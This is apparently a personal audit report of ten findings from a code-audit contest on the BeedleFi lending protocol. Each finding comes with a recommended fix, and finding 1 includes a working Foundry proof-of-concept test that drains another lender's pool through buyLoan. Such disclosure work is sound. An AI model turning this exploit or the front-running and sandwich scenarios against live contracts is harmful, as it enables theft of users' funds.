# What is BeedleFi?

Oracle free peer to peer perpetual lending protocol.

[Link to the contest](https://www.codehawks.com/contests/clkbo1fa20009jr08nyyf9wbx)

# Issues found by me

| Severity | Title                                                                                                       | Link                                                         |
| :------- | :---------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------- |
| High     | Lender.sol#buyLoan - Anyone can buy loans on behalf of other lenders, potentially draining all of the pools | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/533)  |
| High     | Lender can change the auction length and take borrowers collateral very fast                                | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/1440) |
| High     | Fees.sol#sellProfits is lacking access control letting anyone cause loss of funds for the protocol          | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/393)  |
| High     | Fees.sol#sellProfits - no slippage protection leaves the function vulnerable to sandwich attacks            | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/387)  |
| High     | In Fees.sol - hardcoded address of ISwapRouter                                                              | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/376)  |
| Medium   | Borrower can end up with a lot bigger interest rate on their loan than expected                             | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/505)  |
| Medium   | Fees.sol#sellProfits won't work if a pool with the hardcoded fee tier doesn't exist                         | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/389)  |
| Medium   | Fees.sol#sellProfits - using block.timestamp as expiration deadline offers no protection                    | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/382)  |
| Medium   | Single-step process for critical ownership transfer is risky                                                | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/372)  |
| Medium   | Pragma set incorrectly as ^0.8.19 which can lead to problems on Arbitrum                                    | [Link](https://github.com/Cyfrin/2023-07-beedle/issues/371)  |

# 1. Lender.sol#buyLoan - Anyone can buy loans on behalf of other lenders, potentially draining all of the pools

## Summary

The `buyLoan(uint256 loanId, bytes32 poolId)` function doesn't verify that the msg.sender is the lender of the poolId passed as a parameter. This enables anyone to buy loans on behalf of someone else's pools and draining them that way.

## Vulnerability Detail

Here is how the attack would go, POC in code is below:

- There is an existing pool of a normal lender - lender1
- Malicious lender - lender2 creates a pool(with big maxLoanRatio so he can get a big loan as a borrower)
- From another address as a borrower he borrows a big loan from his pool
- Auctions the loan, then buys it on behalf of lender1's pool, effectively draining his balance while the loanTokens lender2 transferred to the borrower are now restored(because the loan is supposed to be someone else's now)
- Lender2 has the same balance as he started with, and the Borrower has his loan and collateral tokens
- Lender1 can't auction, seize, or give the Borrower's loan because he is not the lender of the loan(the lender is whoever called the buyLoan function)
  This can be done for any pool in the protocol and can be done a lot more precisely with less amount of liquidity needed if the pools and their balances when deployed are known.

Add this test to Lender.t.sol:

Note: I had to run it with forge test --match-test testCleanCleanPOC -vvv --via-ir because of a stack too deep error.

```javascript
function testExploitPOC() public {
        //Creating lender1's pool(the victim)
        vm.startPrank(lender1);
        Pool memory poolL1 = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 0, //for simple calculations
            outstandingLoans: 0
        });
        bytes32 poolId1 = lender.setPool(poolL1);

        //Creating lender2's pool(the attacker)
        vm.startPrank(lender2);
        Pool memory poolL2 = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 10 * 10 ** 18, //this needs to be big so we can borrow a lot of funds
            auctionLength: 20, //this needs to be low so we can quickly buy the loan without getting error RateTooHigh
            interestRate: 0, //for simple calculations
            outstandingLoans: 0
        });
        bytes32 poolId2 = lender.setPool(poolL2);

        //loanIds
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        //set up the borrow from Lender2's pool
        vm.startPrank(borrower);
        Borrow memory b = Borrow({
            poolId: poolId2,
            debt: 1000 * 10 ** 18,
            collateral: 100 * 10 ** 18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;

        //get the balances of poolId1 and poolId2
        (, , , , uint256 poolId1Balance, , , , ) = lender.pools(poolId1);
        (, , , , uint256 poolId2Balance, , , , ) = lender.pools(poolId2);

        //assert starting balances of borrower are 0, and the pools are with the balances we created them with
        assertEq(0, TERC20(loanToken).balanceOf(borrower));
        assertEq(0, TERC20(loanToken).balanceOf(borrower));
        assertEq(1000 * 10 ** 18, poolId1Balance);
        assertEq(1000 * 10 ** 18, poolId2Balance);

        //borrow from Lender2's pool
        lender.borrow(borrows);
        (address loanLender, address loanBorrower, , , , , , , , ) = lender
            .loans(0);

        //loan is set up correctly where the loan lender is lender2 and loanBorrower is borrower
        assertEq(loanLender, lender2);
        assertEq(loanBorrower, borrower);

        //get the balances of poolId1 and poolId2
        (, , , , poolId1Balance, , , , ) = lender.pools(poolId1);
        (, , , , poolId2Balance, , , , ) = lender.pools(poolId2);

        //assert pool1's balance is the same while pool2 balance is - debt
        assertEq(1000 * 10 ** 18, poolId1Balance);
        assertEq(1000 * 10 ** 18 - b.debt, poolId2Balance);

        vm.startPrank(lender2);
        lender.startAuction(loanIds);
        //skip 1 seconds ahead
        vm.warp(block.timestamp + 1);

        //Buying the loan on behalf of poolId1 which is Lender1's pool. Msg.sender here is lender2
        lender.buyLoan(0, poolId1);

        (, , , , poolId1Balance, , , , ) = lender.pools(poolId1);
        (, , , , poolId2Balance, , , , ) = lender.pools(poolId2);

        //Lender2's pool balance is the same as what he started with
        //Lender1's pool balance is 0
        assertEq(0, poolId1Balance);
        assertEq(1000 * 10 ** 18, poolId2Balance);

        //Borrower has his loan and collateral tokens
        //995e18 and not 1000e18 because of fees
        assertEq(995 * 10 ** 18, TERC20(loanToken).balanceOf(borrower));
        assertEq(995 * 10 ** 18, TERC20(loanToken).balanceOf(borrower));

        //loanLender is still lender2
        (loanLender, , , , , , , , , ) = lender.loans(0);
        assertEq(loanLender, lender2);

        //Now both the borrower and lender2 have their tokens
        //The lender of the loan is still lender2
        //Which means lender1 can't startAuction for the borrower's loan, he can't give it, and he can't seize it - because he's not the lender
        vm.startPrank(lender1);
        vm.expectRevert();
        lender.startAuction(loanIds);
    }
```

## Impact

If the attack is precisely executed it can drain all the pools in the protocol in a very short time.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465

## Recommendation

Add `require(pools[poolId].lender == msg.sender)`, you have this check on almost every other function.

# 2. Lender can change the auction length and take borrowers collateral very fast

## Summary

Borrower can end up in a loan with a lot shorter auction length than expected, resulting in lender being able to liquidate him very quickly and take his collateral as there is no check in the borrow() function that the auction length is the same as the auction length at the time of submitting the transaction.

## Vulnerability Detail

Consider this scenario:

- A malicious lender sets up a pool with a very good conditions to attract borrowers and monitors the mem pool
- When a user submits a transaction to borrow funds, the lender front-runs him and changes the auction length to 1 second. This can be done as there is no MIN_AUCTION_LENGTH constant.
- The borrower ends up in a loan that can be liquidated very quickly - something the borrower did not expect

## Impact

Depending on the loan-to-value ratio, the collateral of the borrower could be worth a lot more than the loan. The lender will be able to liquidate him very quickly and take his collateral.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232

## Recommendation

You can add a variable `auctionLength` that should be passed as an argument to the `borrow` function or you can add it as a parameter of the Borrow struct. Then require `auctionLength` of the Borrow being equal to the `auctionLength` of the pool. Additionally, you can add a `MIN_AUCTION_LENGTH` constant as it makes sense for the auction to be at least a reasonable amount of time.

# 3. Fees.sol#sellProfits is lacking access control letting anyone cause loss of funds for the protocol

## Summary

The function sellProfits is declared public and without any access control:

```javascript
function sellProfits(address _profits) public
```

This lets anyone swap any of the tokens in the Fees contract, at any time they like which can potentially cause the loss of the accrued fees by the protocol.

## Vulnerability Detail

This issue combined with the fact that there is no slippage protection at all when swapping - `amountOutMinimum: 0` means that there is a very high chance of a bad actor intentionally swapping the protocols profits in pools with very high slippage causing the loss of accrued protocol fees.

Note: This issue is completely different than the issue about lack of slippage protection. Even if slippage protection is implemented, you don't want anyone to be able to swap your accrued rewards at any time they like. I.e extreme market conditions(you probably wouldn't want to let anyone swap your accrued USDC when USDC is depegged and -10% of its normal value, and these things are real and happen).

Effectively, an attacker can create a sandwich attack on-demand with this vulnerability:

- Swap a big amount of WETH into Token, where Token is the target `_profits` token making the price of Token drop relatively to WETH.
- Execute the `sellProfits(address _profits)` function where you will receive a lot less WETH than expected because the price of the Token you're swapping has dropped
- Swap back his Tokens into WETH now that the rate is better because of your added Token liquidity

## Impact

At the very least you're letting random actors swap your accrued fees in unfavorable market conditions.

At worst, they are losing your funds and profiting from it.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26

## Recommendation

Add access control letting the swaps be performed only by the governance or whoever is responsible for the fees.

# 4. Fees.sol#sellProfits - no slippage protection leaves the function vulnerable to sandwich attacks

## Summary

In Fees.sol, the function sellProfits() which is used to swap loan tokens for collateral tokens(WETH) from liquidations doesn't have slippage protection making it vulnerable to sandwich attacks.

## Vulnerability Detail

Given that both `amountOutMinimum` and `sqrtPriceLimitX96` are set to 0, there is no slippage protection, meaning the contract will definitely get exploited via a sandwich attack while trying to swap.

In this context, `amountOutMinimum` is the minimum amount of tokens(WETH) we are ready to receive and it is currently hardcoded to 0.

For more information about [sqrtPriceLimitX96 and slippage protection read here](https://uniswapv3book.com/docs/milestone_3/slippage-protection/).

These attacks are extremely common, and many MEV bots are looking exactly for this kind of unsafe swaps, making the chance of getting sandwiched extremely high.

## Impact

Loss of funds from sandwich attack when swapping tokens because of lack of slippage control

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38

## Recommendation

Calculate the amountOutMinimum earlier in the function or pass it as a parameter. Then check if the contract received the required tokens.

# 5. In Fees.sol - hardcoded address of ISwapRouter

## Summary

Hardcoding addresses the way it is done in Fees.sol is not a good practice.

## Vulnerability Detail

The Uniswap v3 router is hardcoded:

```javascript
ISwapRouter public constant swapRouter =
      ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
```

This could lead to problems because:

- The router might be deployed on another address on another chain
- For some reason, Uniswap may deploy the router to some other address - making improvements on it, a bug gets discovered in the current contract, etc
  Both of those cases will lead to the contract not working correctly.

## Impact

Fees.sol will not work if the address of the router changes or is deployed on another address on a different chain.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L16

## Recommendation

Pass the address of the SwapRouter in the constructor and/or create functionality for changing it, accessible only by the governance.

# 6. Borrower can end up with a lot bigger interest rate on their loan than expected

## Summary

Borrowers can end up with a lot bigger interest rate on their loan than expected as there is no check in the borrow() function that the interest rate is the same as the interest rate at the time of submitting the transaction.

## Vulnerability Detail

Consider this scenario:

- A malicious lender sets up a pool with a very low interest rate to attract borrowers and monitors the mem pool
- When a user submits a transaction to borrow funds, the lender front-runs him and changes the interest rate to `MAX_INTEREST_RATE = 100_000` Considering this is interest rate per second as stated by the comments in Structs.sol, the number 100 000 is very significant and could be 10-20 times bigger than the expected interest rate from the borrower
- The borrower ends up with an extremely expensive loan that he has to pay and he might not even notice that the interest rate is changed, racking up a huge bill

The lender then can proceed and change the interest rate of the pool back to a very low number to bait more borrowers in.(The interest rate of the loan is initialized with the pool.interestRate at the time of borrowing. Changing the interest rate of the pool does not affect past loans.

## Impact

The impact is loss of funds for the borrowers as they have to pay a lot more than expected and reputational damage for the protocol because every lender can do this so people will be hesitant to use the protocol.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L221

## Recommendation

Add a parameter `desiredInterestRate` either to be passed in the function or inside the `Borrow` struct. Then check for it inside the function: `require(pool.interestRate <= desiredInterestRate)`

# 7. Fees.sol#sellProfits won't work if a pool with the hardcoded fee tier doesn't exist

## Summary

In function sellProfits() the fee tier is hardcoded as `fee: 3000`. However, there is no guarantee that a pool with that fee tier for WETH and the loan tokens will exist on the chain the contract is being deployed.

## Vulnerability Detail

More information about [fee tiers can be found here](https://soliditydeveloper.com/uniswap3) but I'll quote the important part here:

"Medium Risk Pairs: 0.30%. The medium risk are considered any non-related pairs which have a high trading volume/popularity, Popular pairs tend to have a slightly lower risk in volatility.

High Risk Pairs: 1.00%. Any other exotic pairs will be considered high risk for liquidity providers and incur the highest trading fee of 1%."

It is not safe to assume that the trading pair of loanToken/WETH has high trading volume/popularity to be considered Medium risk and therefore will have 0.30% fee.

There is a chance that it will be considered High risk and the fee will be 1%(10000).

## Impact

The sellProfits() function won't work.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L34

## Recommendation

Pass the fee as a parameter or handle the cases in which the pool with 3000 fee does not exist.

# 8. Fees.sol#sellProfits - using block.timestamp as expiration deadline offers no protection

## Summary

AMMs like Uniswap V3 allow users to specify a deadline parameter that enforces a time limit by which the transaction must be executed. Without a deadline parameter, the transaction may sit in the mempool and be executed at a much later time potentially resulting in a worse price for the user.

However, using `block.timestamp` for the deadline offers no protection at all.

## Vulnerability Detail

Whenever the miner decides to include the txn in a block, it will be valid at that time, since `block.timestamp` will be the current timestamp(i.e the timestamp of including the txn in the block, doesn't matter when it was submitted).

Therefore, `block.timestamp` offers no protection at all against executing the transaction at a much later time than intended.

## Impact

A miner can just hold the transaction until maximum slippage is incurred.

Or find a way to benefit himself, he can hold the transaction, which may be done in order to free up capital to ensure that there are funds available to do operations to prevent liquidation.

Regardless of this, a deadline was intended to be implemented by the function but as of now, it serves no purpose at all.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L36

## Recommendation

Add a deadline argument to the function and pass it along to the AMM call.

# 9. Single-step process for critical ownership transfer is risky

## Summary

Single-step process for critical ownership transfer is risky due to possible human error which could result in locking all the functions that use the onlyOwner modifier.

## Vulnerability Detail

The custom contract Ownable.sol is inherited by Lender.sol which gives ownable functionality.

However, its implementation is not safe currently as the process is 1-step which is risky due to a possible human error and such an error is unrecoverable. For example, an incorrect address, for which the private key is not known, could be passed accidentally.

## Impact

Critical functions using the onlyOwner modifier will be locked - setLenderFee(), setBorrowerFee(), setFeeReceiver().

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L10

## Recommendation

Implement the change of ownership in 2 steps:

- Approve a new address as a pendingOwner
- A transaction from the pendingOwner address claims the pending ownership change.

This mitigates the risk because if an incorrect address is used in step (1) then it can be fixed by re-approving the correct address. Only after a correct address is used in step (1) can step (2) happen and complete the ownership change.

# 10. Pragma set incorrectly as ^0.8.19 which can lead to problems on Arbitrum

## Summary

Pragma has been set to `^0.8.19` but this can lead to problems when deploying on Arbitrum as it currently is [not compatible](https://docs.arbitrum.io/solidity-support) with 0.8.20 and newer.

## Vulnerability Detail

Contracts compiled with those versions will result in a nonfunctional or potentially damaged version that won't behave as expected.

By default, the compiler will use the latest version available, which means that contracts will be compiled with the 0.8.20 version. This can result in broken code when deployed on the Arbitrum network.

The sponsors did confirm that they'll start with deploying on Optimism and then will deploy on other L2 chains so I think this is a valid concern.

## Impact

Damaged or nonfunctional contracts when deployed on Arbitrum

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L2

## Recommendation

Specify pragma as follows: `pragma solidity 0.8.19`

or

`pragma solidity >=0.8.0 <=0.8.19`
